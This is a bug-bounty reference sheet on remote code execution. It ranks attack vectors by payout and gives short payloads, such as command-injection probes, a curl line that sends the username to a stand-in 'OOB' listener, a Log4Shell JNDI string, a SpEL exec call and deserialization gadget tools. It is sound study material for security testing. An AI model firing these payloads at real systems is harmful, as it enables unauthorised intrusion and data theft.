# RCE — Remote Code Execution (deep)

Ceiling impact. Paid patterns (H1): GitLab *BulkImports DecompressedArchiveSizeValidator* **$33.5k**;
PayPal *npm dependency-confusion* **$30k** (Uber same **$9k**); Twitter/xAI *pre-auth RCE on VPN* **$20k**;
GitLab *ExifTool RCE (CVE-2021-22204)* **$20k**; GitLab *unsafe Kramdown options* **$20k**; Shopify Scripts
*struct type-confusion* **$18k**; GitLab *git flag injection → file overwrite → RCE* **$12k**; GitLab
*path traversal → RCE* **$12k**; Uber *Flask/Jinja2 SSTI → RCE* **$10k**; Grafana *SMTP param injection RCE*
**$5k**; Aiven *Kafka Connect JAAS JndiLoginModule RCE* and *SQLite-JDBC upload+SSRF → RCE* **$5k**.

## Vectors, ranked by payout

### 1. Dependency confusion / supply chain (top payer)
Internal package names referenced in `package.json`/`.npmrc`/`requirements.txt`/`Gemfile`/webpack bundles
but **not claimed** on the public registry → publish a same-name package with an `install` hook → RCE on
build/CI. Harvest names from JS bundles + leaked lockfiles. Own the name only to prove; never squat others'.

### 2. Insecure deserialization
Look for serialized blobs in cookies, JWT, `ViewState`, hidden fields, request bodies, cache keys.
| Platform | Signature | Gadget tool |
|---|---|---|
| Java | `rO0AB` (base64) / `AC ED 00 05` | `ysoserial` (CommonsCollections, etc.) |
| PHP | `O:8:"..."` / `a:2:{` | `phpggc` |
| Python | pickle `\x80\x04`, `PyYAML load` | manual `__reduce__` / `!!python/object/apply` |
| Ruby | Marshal `\x04\x08`, `Oj`/`YAML.load` | universal Ruby gadget |
| .NET | `AAEAAAD/////` | `ysoserial.net` |
| Node | `_$$ND_FUNC$$_` (`node-serialize`) | IIFE payload |

### 3. Injection to code
- **Command injection:** shell metachars in filename, params, git args (`--upload-pack`, flag injection),
  archive members. Probe `;id`,`|id`,`` `id` ``,`$(id)`,`%0aid`; blind → `;curl http://OOB/$(whoami)`.
- **SSTI → RCE:** see [ssti.md](ssti.md) (Uber Jinja2 $10k).
- **SQLi → RCE:** stacked queries, `xp_cmdshell` (MSSQL), `INTO OUTFILE`/UDF (MySQL), `COPY … PROGRAM` (PG).
- **JNDI / Log4Shell:** `${jndi:ldap://OOB/x}` in any logged field; Kafka Connect JAAS `JndiLoginModule`.
- **EL/OGNL/SpEL:** `${T(java.lang.Runtime).getRuntime().exec('id')}` in Spring/Struts params.

### 4. File / media processing
- **ImageMagick** (ImageTragick CVE-2016-3714, and MSL/`caption:`), **ExifTool** (CVE-2021-22204 — DjVu
  metadata, GitLab $20k), **Ghostscript** (`-dSAFER` bypass), **FFmpeg** (HLS/m3u8 → SSRF/LFR, TikTok),
  **libvips/pdf** renderers. Upload a crafted image/PDF/SVG/DjVu and watch OOB.

### 5. Archive / import handling
Zip-slip (`../` in archive entry → file overwrite → RCE), decompression-size/type validators (GitLab
BulkImports $33.5k), tar symlink, XML/YAML config import.

### 6. Upload → webshell
Extension/content-type bypass → drop `.php`/`.jsp`/`.aspx` in a served dir. See [payloads.md](payloads.md)
upload bypass and the upload paid-patterns; chain path-traversal overwrite of an executable path.

## Detect & prove
OOB canary (DNS/HTTP to your listener), time delay (`sleep 10`), or read/write a canary file. **Proof bar:**
run a command and show output, exfil a unique canary, or read a secret file — a stack trace alone is N/A.
RCE unauth = CVSS 9.8. Always confirm it's an in-scope, production host before deep exploitation.
